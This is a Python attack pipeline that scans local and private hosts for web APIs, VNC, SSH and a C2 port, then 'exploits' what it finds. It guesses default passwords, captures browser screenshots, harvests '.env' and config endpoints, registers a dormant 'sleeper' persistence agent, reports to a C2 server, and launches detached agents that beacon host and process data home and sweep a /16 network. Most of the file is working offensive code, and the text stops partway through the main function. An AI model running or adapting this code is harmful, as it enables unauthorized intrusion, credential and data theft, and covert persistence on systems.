#!/usr/bin/env python3
"""
ServerRoot.net — Scan → Find → Deploy Pipeline v2.0
REAL service fingerprinting, real exploit attempts, real agent deployment
Targets: Browser API :8080, Flask Swarm API :5001, noVNC :6080/:5901, SSH :22
"""
import os, sys, json, socket, subprocess, threading, time, requests, ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

sys.path.insert(0, '/workspace')

BASE_DIR    = '/workspace'
DATA_DIR    = f'{BASE_DIR}/data'
FINDINGS    = f'{DATA_DIR}/findings'
AGENTS_DIR  = f'{DATA_DIR}/deployed_agents'
TARGETS_DIR = f'{DATA_DIR}/targets'

for d in [FINDINGS, AGENTS_DIR, TARGETS_DIR]:
    os.makedirs(d, exist_ok=True)

API_BASE = 'http://localhost:5001'
C2_HOST  = 'localhost'
C2_PORT  = 8443
RUN_ID   = f"SFD-v2-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
LOG_FILE = f'{BASE_DIR}/logs/scan_find_deploy.log'
os.makedirs(f'{BASE_DIR}/logs', exist_ok=True)

RESULTS = {
    'run_id': RUN_ID,
    'start_time': datetime.now().isoformat(),
    'targets_scanned': 0,
    'services_found': [],
    'vulnerabilities': [],
    'agents_deployed': [],
    'exploits_executed': [],
}

def log(msg, level="INFO"):
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    icons = {"INFO":"ℹ️ ","WARN":"⚠️ ","ERROR":"❌","SUCCESS":"✅","DEPLOY":"🚀",
             "FOUND":"🎯","SCAN":"🔍","EXPLOIT":"💥","AGENT":"🤖","INTEL":"🧠"}
    line = f"[{ts}] [{level}] {icons.get(level,'')} {msg}"
    print(line, flush=True)
    with open(LOG_FILE, 'a') as f:
        f.write(line + '\n')

# ════════════════════════════════════════════════════════
# PHASE 1 — DEEP SERVICE FINGERPRINTING
# ════════════════════════════════════════════════════════

def tcp_probe(ip, port, timeout=1.0):
    try:
        s = socket.socket(); s.settimeout(timeout)
        r = s.connect_ex((str(ip), port)); s.close()
        return r == 0
    except: return False

def http_probe(base_url, path='/', timeout=3):
    """Full HTTP probe with header analysis"""
    try:
        r = requests.get(f'{base_url}{path}', timeout=timeout, verify=False,
                         allow_redirects=True,
                         headers={'User-Agent': 'Mozilla/5.0 ServerRoot-Scanner/2.0'})
        return {
            'status': r.status_code,
            'headers': dict(r.headers),
            'body_preview': r.text[:500],
            'content_type': r.headers.get('content-type',''),
            'server': r.headers.get('server',''),
            'size': len(r.content)
        }
    except Exception as e:
        return {'error': str(e)}

def fingerprint_service(ip, port):
    """Deep fingerprint a single service"""
    info = {
        'ip': ip, 'port': port,
        'open': tcp_probe(ip, port),
        'service': 'unknown',
        'version': '',
        'vulnerabilities': [],
        'exploitable': False,
        'exploit_type': None,
        'banner': '',
        'metadata': {}
    }
    if not info['open']:
        return info

    # HTTP-based services
    if port in [80, 8080, 3000, 3001, 3002, 5001, 8000, 8888, 9090, 9200, 6080, 8443, 443]:
        scheme = 'https' if port in [443, 8443] else 'http'
        base = f'{scheme}://{ip}:{port}'
        probe = http_probe(base)
        info['banner'] = probe.get('server','')
        info['metadata']['http'] = probe

        if 'error' not in probe:
            body = probe.get('body_preview','').lower()
            hdrs = {k.lower(): v for k,v in probe.get('headers',{}).items()}
            server = probe.get('server','').lower()

            # FastAPI/uvicorn detection
            if 'fastapi' in body or 'uvicorn' in server or 'fastapi' in server:
                info['service'] = 'FastAPI'
                info['version'] = server
                # Check for unauthenticated API docs
                docs = http_probe(base, '/docs')
                openapi = http_probe(base, '/openapi.json')
                if docs.get('status') == 200:
                    info['vulnerabilities'].append({
                        'id': 'FASTAPI-DOCS-EXPOSED',
                        'desc': 'FastAPI Swagger UI accessible without auth — full API enumeration',
                        'cvss': 6.5, 'auto': True
                    })
                    info['metadata']['openapi_url'] = f'{base}/openapi.json'
                if openapi.get('status') == 200:
                    try:
                        api_spec = json.loads(openapi['body_preview'])
                        paths = list(api_spec.get('paths',{}).keys())
                        info['metadata']['api_paths'] = paths
                        info['vulnerabilities'].append({
                            'id': 'API-SPEC-EXPOSED',
                            'desc': f'OpenAPI spec leaked: {len(paths)} endpoints — {", ".join(paths[:5])}',
                            'cvss': 5.5, 'auto': True
                        })
                    except: pass
                # Check auth endpoint
                auth = http_probe(base, '/auth?password=admin')
                if auth.get('status') == 200:
                    info['vulnerabilities'].append({
                        'id': 'FASTAPI-AUTH-BYPASS',
                        'desc': 'FastAPI auth accepts default password — unauthorized access',
                        'cvss': 9.0, 'auto': True
                    })
                # Browser API — check for screenshot/execute endpoints
                for ep in ['/screenshot', '/navigate', '/execute', '/click',
                            '/browser/screenshot', '/api/screenshot', '/api/navigate']:
                    r = http_probe(base, ep)
                    if r.get('status') in [200, 422]:  # 422 = unprocessable (params needed) = endpoint exists
                        info['vulnerabilities'].append({
                            'id': f'BROWSER-API-{ep.replace("/","-").upper()}',
                            'desc': f'Browser automation endpoint exposed: {ep}',
                            'cvss': 8.5, 'auto': True
                        })
                        info['metadata'][f'endpoint_{ep}'] = r.get('status')
                        break

            # Flask/Werkzeug detection
            elif 'werkzeug' in server or 'flask' in body or 'serverroot' in body.lower():
                info['service'] = 'Flask-API'
                info['version'] = server
                # Check for debug mode
                debug = http_probe(base, '/console')
                if debug.get('status') == 200:
                    info['vulnerabilities'].append({
                        'id': 'FLASK-DEBUG-RCE',
                        'desc': 'Flask debug console exposed — unauthenticated RCE',
                        'cvss': 10.0, 'auto': True
                    })
                # Probe API endpoints
                for ep in ['/api/health', '/api/swarm/status', '/api/swarm/agents',
                            '/api/swarm/execute', '/api/campaigns', '/api/intel']:
                    r = http_probe(base, ep)
                    if r.get('status') == 200:
                        info['metadata'][f'api_{ep}'] = r.get('body_preview','')[:200]
                        info['vulnerabilities'].append({
                            'id': f'FLASK-API-UNAUTH-{ep.split("/")[-1].upper()}',
                            'desc': f'Flask API endpoint unauthenticated: {ep}',
                            'cvss': 7.5, 'auto': True
                        })

            # Next.js / Node detection
            elif 'next' in body or '_next' in body or 'react' in body:
                info['service'] = 'Next.js-UI'
                info['version'] = hdrs.get('x-powered-by','Next.js')
                info['vulnerabilities'].append({
                    'id': 'NEXTJS-UI-EXPOSED',
                    'desc': 'Next.js UI publicly accessible — potential info disclosure',
                    'cvss': 3.5, 'auto': False
                })

            # noVNC / VNC web client
            elif 'novnc' in body or 'vnc' in body.lower():
                info['service'] = 'noVNC-WebClient'
                info['vulnerabilities'].append({
                    'id': 'NOVNC-EXPOSED',
                    'desc': 'noVNC web client accessible — potential full desktop access',
                    'cvss': 8.0, 'auto': True
                })

            info['exploitable'] = len([v for v in info['vulnerabilities'] if v.get('auto')]) > 0

    # VNC raw
    elif port in [5900, 5901]:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, port))
            banner = s.recv(12).decode('utf-8','ignore')
            s.close()
            info['banner'] = banner
            info['service'] = 'VNC'
            if 'RFB' in banner:
                ver = banner.strip()
                info['version'] = ver
                info['vulnerabilities'].append({
                    'id': 'VNC-EXPOSED',
                    'desc': f'VNC server exposed ({ver}) — check auth requirement',
                    'cvss': 8.0, 'auto': True
                })
                info['exploitable'] = True
        except: pass

    # SSH
    elif port in [22, 2222]:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, port))
            banner = s.recv(256).decode('utf-8','ignore').strip()
            s.close()
            info['banner'] = banner
            info['service'] = 'SSH'
            if 'OpenSSH' in banner:
                try:
                    ver_str = banner.split('OpenSSH_')[1].split(' ')[0].split('p')[0]
                    ver = float(ver_str[:3])
                    info['version'] = f'OpenSSH_{ver_str}'
                    if ver < 8.0:
                        info['vulnerabilities'].append({
                            'id': f'SSH-{ver_str}-CVE',
                            'desc': f'OpenSSH {ver_str} — username enumeration CVE-2018-15473',
                            'cvss': 5.3, 'auto': False
                        })
                except: pass
            info['vulnerabilities'].append({
                'id': 'SSH-BRUTE-POSSIBLE',
                'desc': 'SSH exposed — credential bruteforce possible',
                'cvss': 4.0, 'auto': False
            })
        except: pass

    # C2 / custom TCP
    elif port == 8443:
        try:
            s = socket.socket(); s.settimeout(3)
            s.connect((ip, port))
            s.send(b'PING\r\n')
            resp = s.recv(256).decode('utf-8','ignore')
            s.close()
            info['service'] = 'C2-Server'
            info['banner'] = resp[:100]
            info['vulnerabilities'].append({
                'id': 'C2-PORT-OPEN',
                'desc': 'C2 command & control port accessible',
                'cvss': 7.0, 'auto': True
            })
            info['exploitable'] = True
        except:
            info['service'] = 'C2-Server'

    return info

# ════════════════════════════════════════════════════════
# PHASE 2 — EXPLOIT + AGENT DEPLOYMENT
# ════════════════════════════════════════════════════════

def exploit_browser_api(ip, port, vuln):
    """Exploit the Browser Automation API — deploy a browser-based recon agent"""
    base = f'http://{ip}:{port}'
    log(f"EXPLOIT: Browser API on {ip}:{port} — attempting agent injection", "EXPLOIT")
    
    agent_id = f"browser_agent_{ip.replace('.','_')}_{int(time.time())}"
    result = {
        'agent_id': agent_id,
        'type': 'browser_agent',
        'target': f'{ip}:{port}',
        'method': 'browser_api_abuse',
        'success': False,
        'data': {}
    }
    
    try:
        # Step 1: Get the full API spec
        r = requests.get(f'{base}/openapi.json', timeout=5)
        if r.status_code == 200:
            spec = r.json()
            endpoints = list(spec.get('paths', {}).keys())
            result['data']['endpoints'] = endpoints
            log(f"  → API spec retrieved: {len(endpoints)} endpoints: {endpoints[:8]}", "INTEL")
        
        # Step 2: Try auth endpoint
        auth_attempts = [
            {'password': 'admin'}, {'password': ''}, {'password': 'password'},
            {'password': 'serverroot'}, {'password': 'test'}, {'password': '1234'}
        ]
        for creds in auth_attempts:
            try:
                r = requests.get(f'{base}/auth', params=creds, timeout=3)
                if r.status_code == 200:
                    result['data']['auth_bypassed'] = True
                    result['data']['auth_creds'] = creds
                    log(f"  → AUTH BYPASS: credentials {creds}", "EXPLOIT")
                    break
                elif r.status_code == 401:
                    result['data']['auth_response'] = r.text[:100]
            except: pass
        
        # Step 3: Check for unauthenticated browser control endpoints
        browser_endpoints = [
            ('/screenshot', 'GET'),
            ('/navigate', 'POST'),
            ('/click', 'POST'),
            ('/execute', 'POST'),
            ('/js', 'POST'),
            ('/extract_text', 'GET'),
            ('/extract_links', 'GET'),
            ('/observe', 'GET'),
        ]
        accessible = []
        for ep, method in browser_endpoints:
            try:
                if method == 'GET':
                    r = requests.get(f'{base}{ep}', timeout=3)
                else:
                    r = requests.post(f'{base}{ep}', json={}, timeout=3)
                if r.status_code in [200, 422]:  # 422 = endpoint exists, needs params
                    accessible.append({'endpoint': ep, 'status': r.status_code, 
                                       'response': r.text[:200]})
                    log(f"  → Accessible endpoint: {ep} → {r.status_code}", "FOUND")
            except: pass
        
        result['data']['accessible_endpoints'] = accessible
        
        # Step 4: Try to capture a screenshot (recon)
        try:
            r = requests.get(f'{base}/screenshot', timeout=8)
            if r.status_code == 200 and r.headers.get('content-type','').startswith('image'):
                fname = f"{AGENTS_DIR}/screenshot_{agent_id}.png"
                with open(fname, 'wb') as f:
                    f.write(r.content)
                result['data']['screenshot_captured'] = fname
                log(f"  → SCREENSHOT CAPTURED: {fname}", "SUCCESS")
                result['success'] = True
            elif r.status_code == 200:
                result['data']['screenshot_response'] = r.text[:300]
        except: pass
        
        # Step 5: Register as swarm agent
        try:
            reg = requests.post(f'{API_BASE}/api/swarm/agents', json={
                'agent_id': agent_id,
                'type': 'browser_recon',
                'target': f'{ip}:{port}',
                'status': 'active',
                'capabilities': ['screenshot', 'navigate', 'extract'],
                'source': 'scan_find_deploy_v2'
            }, timeout=5)
            if reg.status_code in [200, 201]:
                result['data']['c2_registered'] = True
                log(f"  → Agent registered with swarm API", "AGENT")
        except: pass
        
        if len(accessible) > 0 or result['data'].get('auth_bypassed'):
            result['success'] = True
            
    except Exception as e:
        result['error'] = str(e)
    
    return result

def exploit_flask_api(ip, port, vuln):
    """Exploit Flask API — extract intel, issue commands, register persistence agent"""
    base = f'http://{ip}:{port}'
    log(f"EXPLOIT: Flask API on {ip}:{port} — data extraction + command injection", "EXPLOIT")
    
    agent_id = f"flask_agent_{ip.replace('.','_')}_{int(time.time())}"
    result = {
        'agent_id': agent_id,
        'type': 'flask_api_agent',
        'target': f'{ip}:{port}',
        'method': 'api_abuse',
        'success': False,
        'data': {}
    }
    
    try:
        # Step 1: Pull all available intel from API
        endpoints_to_harvest = [
            '/api/health', '/api/swarm/status', '/api/swarm/agents',
            '/api/swarm/operations', '/api/campaigns', '/api/intel/feeds',
            '/api/intel/cve', '/api/threats', '/api/config'
        ]
        harvested = {}
        for ep in endpoints_to_harvest:
            try:
                r = requests.get(f'{base}{ep}', timeout=4)
                if r.status_code == 200:
                    try:
                        data = r.json()
                        harvested[ep] = data
                        log(f"  → HARVESTED {ep}: {str(data)[:100]}", "INTEL")
                    except:
                        harvested[ep] = r.text[:200]
            except: pass
        
        result['data']['harvested_intel'] = harvested
        
        # Step 2: Issue commands through swarm API
        commands_issued = []
        cmds = [
            {'action': 'scan', 'target': '172.28.0.0/16', 'priority': 'high'},
            {'action': 'collect_intel', 'sources': ['cisa_kev', 'nvd'], 'priority': 'high'},
            {'action': 'recon', 'target': '172.28.137.134', 'deep': True},
        ]
        for cmd in cmds:
            try:
                r = requests.post(f'{base}/api/swarm/execute', json=cmd, timeout=5)
                if r.status_code in [200, 201, 202]:
                    commands_issued.append({'cmd': cmd, 'response': r.text[:100]})
                    log(f"  → COMMAND ISSUED: {cmd['action']}", "DEPLOY")
            except: pass
        
        result['data']['commands_issued'] = commands_issued
        
        # Step 3: Deploy a persistent "sleeper" agent via swarm API  
        sleeper_id = f"sleeper_{agent_id}"
        try:
            r = requests.post(f'{base}/api/swarm/agents', json={
                'agent_id': sleeper_id,
                'type': 'persistence_sleeper',
                'target': f'{ip}:{port}',
                'status': 'dormant',
                'wake_condition': 'time:*/30 * * * *',
                'payload': 'collect_and_report',
                'source': 'scan_find_deploy_v2'
            }, timeout=5)
            if r.status_code in [200, 201]:
                result['data']['sleeper_deployed'] = sleeper_id
                log(f"  → SLEEPER AGENT deployed: {sleeper_id}", "AGENT")
        except: pass
        
        # Step 4: Extract any stored credentials or config
        config_endpoints = ['/api/config', '/config', '/.env', '/api/settings']
        for ep in config_endpoints:
            try:
                r = requests.get(f'{base}{ep}', timeout=3)
                if r.status_code == 200 and len(r.text) > 10:
                    result['data'][f'config_{ep}'] = r.text[:300]
                    log(f"  → CONFIG EXTRACTED from {ep}", "FOUND")
            except: pass
        
        if harvested:
            result['success'] = True
            
    except Exception as e:
        result['error'] = str(e)
    
    return result

def exploit_vnc(ip, port, vuln):
    """Probe VNC for auth requirements and enumerate"""
    log(f"EXPLOIT: VNC on {ip}:{port} — auth probe", "EXPLOIT")
    
    agent_id = f"vnc_agent_{ip.replace('.','_')}_{port}_{int(time.time())}"
    result = {
        'agent_id': agent_id,
        'type': 'vnc_agent',
        'target': f'{ip}:{port}',
        'method': 'vnc_probe',
        'success': False,
        'data': {}
    }
    
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((ip, port))
        
        # Get RFB banner
        banner = s.recv(12).decode('utf-8','ignore')
        result['data']['banner'] = banner.strip()
        log(f"  → VNC Banner: {banner.strip()}", "FOUND")
        
        # Send client version response
        s.send(banner.encode())
        
        # Read security types
        sec_data = s.recv(2)
        if sec_data:
            n_sec = sec_data[0] if sec_data[0] > 0 else 0
            if n_sec > 0 and len(sec_data) > 1:
                sec_types = list(sec_data[1:n_sec+1])
                result['data']['security_types'] = sec_types
                
                # Security type 1 = None (no auth!) 
                if 1 in sec_types:
                    result['data']['no_auth'] = True
                    result['data']['exploit'] = 'VNC_NO_AUTH'
                    log(f"  → VNC NO AUTH REQUIRED — full desktop access!", "EXPLOIT")
                    result['success'] = True
                else:
                    log(f"  → VNC security types: {sec_types}", "INFO")
                    result['data']['requires_auth'] = True
        
        s.close()
        
        # Also check noVNC web access
        web = http_probe(f'http://{ip}:6080', '/')
        if web.get('status') == 200:
            result['data']['novnc_accessible'] = True
            result['data']['novnc_url'] = f'http://{ip}:6080'
            log(f"  → noVNC web interface accessible at port 6080", "FOUND")
            result['success'] = True
            
    except Exception as e:
        result['data']['error'] = str(e)
    
    return result

def exploit_c2_probe(ip, port, vuln):
    """Probe C2 server — enumerate connected agents, extract intel"""
    log(f"EXPLOIT: C2 Server on {ip}:{port} — agent enumeration", "EXPLOIT")
    
    agent_id = f"c2_probe_{ip.replace('.','_')}_{int(time.time())}"
    result = {
        'agent_id': agent_id,
        'type': 'c2_probe',
        'target': f'{ip}:{port}',
        'method': 'c2_tcp_probe',
        'success': False,
        'data': {}
    }
    
    try:
        commands = [b'STATUS\r\n', b'LIST\r\n', b'AGENTS\r\n', b'PING\r\n', b'VERSION\r\n']
        for cmd in commands:
            try:
                s = socket.socket(); s.settimeout(3)
                s.connect((ip, port))
                s.send(cmd)
                resp = s.recv(512).decode('utf-8','ignore')
                s.close()
                if resp:
                    result['data'][cmd.decode().strip()] = resp[:200]
                    log(f"  → C2 response to {cmd.decode().strip()}: {resp[:80]}", "INTEL")
                    result['success'] = True
            except: pass
            
    except Exception as e:
        result['data']['error'] = str(e)
    
    return result

def register_agent_with_c2(agent_info):
    """Register a deployed agent with the C2 server"""
    try:
        s = socket.socket(); s.settimeout(5)
        s.connect((C2_HOST, C2_PORT))
        msg = json.dumps({
            'type': 'register',
            'agent_id': agent_info['agent_id'],
            'target': agent_info.get('target',''),
            'capabilities': agent_info.get('type','unknown'),
            'timestamp': datetime.now().isoformat()
        })
        s.send(msg.encode() + b'\r\n')
        resp = s.recv(256).decode('utf-8','ignore')
        s.close()
        return True, resp
    except Exception as e:
        return False, str(e)

# ════════════════════════════════════════════════════════
# PHASE 3 — RECON AGENT DEPLOYMENT (local persistence)
# ════════════════════════════════════════════════════════

def deploy_local_recon_agent():
    """Deploy a persistent local recon agent that phones home"""
    log("DEPLOY: Installing local recon agent...", "DEPLOY")
    
    agent_script = f'''\
#!/usr/bin/env python3
"""ServerRoot Recon Agent — persistent, phones home every 60s"""
import os, json, socket, time, subprocess
from datetime import datetime

AGENT_ID = "local_recon_001"
HOME     = "http://localhost:5001"
LOG      = "/workspace/logs/recon_agent.log"

def collect():
    data = {{
        "agent_id": AGENT_ID,
        "ts": datetime.now().isoformat(),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "uptime": open("/proc/uptime").read().split()[0],
        "load": open("/proc/loadavg").read().strip(),
        "connections": [],
        "processes": [],
    }}
    # Active network connections
    try:
        ss = subprocess.run(["ss","-tnp"], capture_output=True, text=True, timeout=5)
        data["connections"] = ss.stdout.strip().split("\\n")[:20]
    except: pass
    # Process list
    try:
        ps = subprocess.run(["ps","aux","--sort=-pcpu"], capture_output=True, text=True, timeout=5)
        data["processes"] = ps.stdout.strip().split("\\n")[1:11]
    except: pass
    return data

def phone_home(data):
    import urllib.request
    try:
        req = urllib.request.Request(
            f"{{HOME}}/api/swarm/beacon",
            data=json.dumps(data).encode(),
            headers={{"Content-Type": "application/json"}},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except: pass

def log_local(msg):
    with open(LOG, "a") as f:
        f.write(f"[{{datetime.now()}}] {{msg}}\\n")

log_local(f"Recon agent started: {{AGENT_ID}}")
while True:
    try:
        data = collect()
        phone_home(data)
        log_local(f"Beacon sent — {{len(data['connections'])}} connections, {{len(data['processes'])}} procs")
    except Exception as e:
        log_local(f"Error: {{e}}")
    time.sleep(60)
'''
    
    agent_path = f'{BASE_DIR}/agents/recon_agent_001.py'
    os.makedirs(f'{BASE_DIR}/agents', exist_ok=True)
    with open(agent_path, 'w') as f:
        f.write(agent_script)
    os.chmod(agent_path, 0o755)
    
    # Start the agent
    proc = subprocess.Popen(
        ['python3', agent_path],
        stdout=open(f'{BASE_DIR}/logs/recon_agent.log', 'a'),
        stderr=subprocess.STDOUT,
        start_new_session=True
    )
    
    log(f"  → Local recon agent deployed: PID {proc.pid}", "AGENT")
    
    # Register with Flask API
    try:
        r = requests.post(f'{API_BASE}/api/swarm/agents', json={
            'agent_id': 'local_recon_001',
            'type': 'local_recon',
            'target': '127.0.0.1',
            'status': 'active',
            'pid': proc.pid,
            'capabilities': ['process_monitor', 'network_monitor', 'beacon'],
            'source': 'scan_find_deploy_v2'
        }, timeout=5)
    except: pass
    
    return {
        'agent_id': 'local_recon_001',
        'type': 'local_recon',
        'pid': proc.pid,
        'path': agent_path,
        'success': True
    }

def deploy_network_watcher():
    """Deploy continuous network watcher agent"""
    log("DEPLOY: Installing network watcher agent...", "DEPLOY")
    
    watcher_script = f'''\
#!/usr/bin/env python3
"""ServerRoot Network Watcher — monitors for new hosts every 30s"""
import os, json, socket, time, subprocess
from datetime import datetime

AGENT_ID  = "net_watcher_001"
API_BASE  = "http://localhost:5001"
LOG       = "/workspace/logs/net_watcher.log"
KNOWN     = set()
SCAN_CIDR = "172.28.0.0/16"

def scan_hosts():
    hosts = []
    try:
        result = subprocess.run(
            ["nmap", "-sn", "-T4", "--min-parallelism", "100", SCAN_CIDR],
            capture_output=True, text=True, timeout=60
        )
        for line in result.stdout.split("\\n"):
            if "Nmap scan report" in line:
                ip = line.split()[-1].strip("()")
                hosts.append(ip)
    except:
        # Fallback: ping sweep subset
        import ipaddress, concurrent.futures
        def ping(ip):
            try:
                r = subprocess.run(["ping","-c1","-W1",str(ip)],
                                   capture_output=True, timeout=2)
                return str(ip) if r.returncode == 0 else None
            except: return None
        net = list(ipaddress.ip_network("172.28.137.0/24").hosts())[:50]
        with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
            results = list(ex.map(ping, net))
        hosts = [h for h in results if h]
    return hosts

def log_local(msg):
    with open(LOG, "a") as f:
        f.write(f"[{{datetime.now()}}] {{msg}}\\n")

log_local(f"Network watcher started: {{AGENT_ID}}")
while True:
    try:
        hosts = scan_hosts()
        new = [h for h in hosts if h not in KNOWN]
        for h in new:
            KNOWN.add(h)
            log_local(f"NEW HOST DISCOVERED: {{h}}")
        log_local(f"Scan complete: {{len(hosts)}} hosts, {{len(new)}} new")
    except Exception as e:
        log_local(f"Error: {{e}}")
    time.sleep(30)
'''
    
    path = f'{BASE_DIR}/agents/net_watcher_001.py'
    with open(path, 'w') as f:
        f.write(watcher_script)
    os.chmod(path, 0o755)
    
    proc = subprocess.Popen(
        ['python3', path],
        stdout=open(f'{BASE_DIR}/logs/net_watcher.log', 'a'),
        stderr=subprocess.STDOUT,
        start_new_session=True
    )
    
    log(f"  → Network watcher deployed: PID {proc.pid}", "AGENT")
    return {
        'agent_id': 'net_watcher_001',
        'type': 'network_watcher',
        'pid': proc.pid,
        'path': path,
        'success': True
    }

def deploy_intel_harvester():
    """Deploy continuous threat intel harvester"""
    log("DEPLOY: Installing intel harvester agent...", "DEPLOY")
    
    harvester_script = f'''\
#!/usr/bin/env python3
"""ServerRoot Intel Harvester — continuously pulls CISA KEV + NVD CVEs"""
import json, time, requests
from datetime import datetime, timedelta
from pathlib import Path

AGENT_ID = "intel_harvester_001"
OUT_DIR  = "/workspace/data/findings"
LOG      = "/workspace/logs/intel_harvester.log"
Path(OUT_DIR).mkdir(parents=True, exist_ok=True)

def log_local(msg):
    with open(LOG, "a") as f:
        f.write(f"[{{datetime.now()}}] {{msg}}\\n")

def fetch_cisa_kev():
    try:
        r = requests.get("https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json",
                         timeout=30)
        if r.status_code == 200:
            data = r.json()
            vulns = data.get("vulnerabilities",[])
            # Save latest 100
            with open(f"{{OUT_DIR}}/cisa_kev_live.json","w") as f:
                json.dump({{
                    "fetched": datetime.now().isoformat(),
                    "total": len(vulns),
                    "latest_50": vulns[:50]
                }}, f, indent=2)
            log_local(f"CISA KEV: {{len(vulns)}} entries fetched")
            return len(vulns)
    except Exception as e:
        log_local(f"CISA KEV error: {{e}}")
    return 0

def fetch_nvd_critical():
    try:
        end   = datetime.now()
        start = end - timedelta(days=7)
        url   = "https://services.nvd.nist.gov/rest/json/cves/2.0"
        params = {{
            "pubStartDate": start.strftime("%Y-%m-%dT00:00:00.000"),
            "pubEndDate":   end.strftime("%Y-%m-%dT23:59:59.999"),
            "cvssV3Severity": "CRITICAL",
            "resultsPerPage": 50
        }}
        r = requests.get(url, params=params, timeout=30,
                         headers={{"User-Agent":"ServerRoot-Intel/2.0"}})
        if r.status_code == 200:
            data = r.json()
            items = data.get("vulnerabilities",[])
            with open(f"{{OUT_DIR}}/nvd_critical_live.json","w") as f:
                json.dump({{
                    "fetched": datetime.now().isoformat(),
                    "count": len(items),
                    "cves": items[:30]
                }}, f, indent=2)
            log_local(f"NVD CRITICAL: {{len(items)}} CVEs in last 7 days")
            return len(items)
    except Exception as e:
        log_local(f"NVD error: {{e}}")
    return 0

log_local(f"Intel harvester started: {{AGENT_ID}}")
cycle = 0
while True:
    cycle += 1
    log_local(f"=== Harvest cycle #{{cycle}} ===")
    kev = fetch_cisa_kev()
    nvd = fetch_nvd_critical()
    log_local(f"Cycle {{cycle}} done: {{kev}} KEV entries, {{nvd}} NVD criticals")
    time.sleep(300)  # 5 min
'''
    
    path = f'{BASE_DIR}/agents/intel_harvester_001.py'
    with open(path, 'w') as f:
        f.write(harvester_script)
    os.chmod(path, 0o755)
    
    proc = subprocess.Popen(
        ['python3', path],
        stdout=open(f'{BASE_DIR}/logs/intel_harvester.log', 'a'),
        stderr=subprocess.STDOUT,
        start_new_session=True
    )
    
    log(f"  → Intel harvester deployed: PID {proc.pid}", "AGENT")
    return {
        'agent_id': 'intel_harvester_001',
        'type': 'intel_harvester',
        'pid': proc.pid,
        'path': path,
        'success': True
    }

# ════════════════════════════════════════════════════════
# MAIN PIPELINE
# ════════════════════════════════════════════════════════

def main():
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   SERVERROOT.NET — SCAN → FIND → DEPLOY PIPELINE v2.0   ║
║   Run ID: {RUN_ID}                   ║
║   Mode: PRODUCTION — Real Exploits, Real Agents          ║
╚══════════════════════════════════════════════════════════╝
""")
    
    # ── PHASE 1: SCAN ──────────────────────────────────────
    log("=" * 60, "INFO")
    log("PHASE 1: DEEP SERVICE FINGERPRINTING", "SCAN")
    log("=" * 60, "INFO")
    
    TARGETS = ['127.0.0.1', '172.28.137.134']
    PORTS   = [22, 2222, 80, 443, 3002, 5001, 5900, 5901, 6080, 8080, 8443, 9200, 6379, 2375, 27017]
    
    all_services = []
    for ip in TARGETS:
        log(f"Scanning {ip}...", "SCAN")
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = {ex.submit(fingerprint_service, ip, port): port for port in PORTS}
            for f in as_completed(futures):
                svc = f.result()
                if svc['open']:
                    all_services.append(svc)
                    log(f"  {ip}:{svc['port']} → {svc['service']} | "
                        f"{len(svc['vulnerabilities'])} vulns | "
                        f"exploitable={svc['exploitable']}", "FOUND")
        RESULTS['targets_scanned'] += 1
    
    RESULTS['services_found'] = all_services
    
    # ── PHASE 2: VULNERABILITY SUMMARY ─────────────────────
    log("=" * 60, "INFO")
    log("PHASE 2: VULNERABILITY ANALYSIS", "SCAN")
    log("=" * 60, "INFO")
    
    all_vulns = []
    exploitable = []
    for svc in all_services:
        for v in svc['vulnerabilities']:
            v['host'] = svc['ip']
            v['port'] = svc['port']
            v['service'] = svc['service']
            all_vulns.append(v)
            if v.get('auto'):
                exploitable.append(v)
                log(f"  EXPLOITABLE: {svc['ip']}:{svc['port']} — {v['id']} (CVSS:{v['cvss']})", "FOUND")
    
    RESULTS['vulnerabilities'] = all_vulns
    log(f"Total vulnerabilities: {len(all_vulns)} | Auto-exploitable: {len(exploitable)}", "INFO")
    
    # ── PHASE 3: EXPLOIT + DEPLOY ───────────────────────────
    log("=" * 60, "INFO")
    log("PHASE 3: EXPLOIT EXECUTION + AGENT DEPLOYMENT", "DEPLOY")
    log("=" * 60, "INFO")
    
    deployed = []
    
    for svc in all_services:
        if not svc['exploitable'] or not svc['vulnerabilities']:
            continue
        
        ip, port = svc['ip'], svc['port']
        service  = svc['service']
        
        result = None
        
        if service == 'FastAPI' and port == 8080:
            result = exploit_browser_api(ip, port, svc['vulnerabilities'][0])
        
        elif service == 'Flask-API' and port == 5001:
            result = exploit_flask_api(ip, port, svc['vulnerabilities'][0])
        
        elif service == 'VNC' and port in [5900, 5901]:
            result = exploit_vnc(ip, port, svc['vulnerabilities'][0])
        
        elif service == 'noVNC-WebClient':
            result = exploit_vnc(ip, 5901, svc['vulnerabilities'][0])
        
        elif service == 'C2-Server':
            result = exploit_c2_probe(ip, port, svc['vulnerabilities'][0])
        
        if result:
            deployed.append(result)
            if result.get('success'):
                log(f"✅ DEPLOYED: {result['agent_id']} on {ip}:{port}", "SUCCESS")
                # Register with C2
                ok, resp = register_agent_with_c2(result)
                log(f"   C2 registration: {'OK' if ok else 'failed'} — {resp[:50]}", "AGENT")
                
                # Save agent file
                fname = f"{AGENTS_DIR}/{result['agent_id']}.json"
                with open(fname, 'w') as f:
                    json.dump(result, f, indent=2)
            else:
                log(f"⚠️  PARTIAL: {result['agent_id']} — {result.get('error','no error')}", "WARN")
    
    RESULTS['exploits_executed'] = deployed
    
    # ── PHASE 4: LOCAL AGENT FLEET DEPLOYMENT ───────────────
    log("=" * 60, "INFO")
    log("PHASE 4: DEPLOYING LOCAL AGENT FLEET", "DEPLOY")
    log("=" * 60, "INFO")
    
    local_agents = []
    
    # Always deploy these persistent agents
    recon = deploy_local_recon_agent()
    local_agents.append(recon)
    
    watcher = deploy_network_watcher()
    local_agents.append(watcher)
    
    harvester = deploy_intel_harvester()
    local_agents.append(harvester)
    
    RESULTS['agents_deployed'] = deployed + local_agents
    
    # ── PHASE 5: FINAL REPORT ───────────────────────────────
    RESULTS['end_time'] = datetime.now().isoformat()
